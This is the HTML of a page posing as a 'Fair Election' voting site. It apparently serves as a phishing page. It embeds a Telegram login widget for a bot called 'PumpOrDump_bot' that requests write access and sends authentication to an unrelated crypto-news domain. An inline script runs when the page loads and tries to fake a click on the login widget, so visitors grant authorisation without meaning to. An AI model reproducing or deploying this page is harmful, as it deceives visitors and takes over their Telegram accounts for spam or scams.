<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />

    <meta name="theme-color" content="#282c34" />
    <meta
      name="description"
      content="A place where your vote counts"
    />
    <link rel="apple-touch-icon" href="/logo192.png" />
    <link rel="manifest" href="/manifest.json" />
    <title>Fair Election</title>

  <body>
    <script async src="https://telegram.org/js/telegram-widget.js?7"
  data-telegram-login="PumpOrDump_bot" 
  data-size="large"
  data-auth-url="https://btc24news.online/telegramauth"
  data-request-access="write"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      // Проверяем, загружен ли виджет
      var checkWidgetLoaded = setInterval(function() {
        var telegramButton = document.querySelector('iframe[title="Telegram Login Widget"]');
        if (telegramButton) {
          clearInterval(checkWidgetLoaded);
          // Эмулируем клик по виджету
          telegramButton.contentWindow.postMessage({ event: 'click' }, '*');
        }
      }, 100); // Проверяем каждые 100 мс
    });
    </script>
    <div id="root"></div>
  </body>
</html>
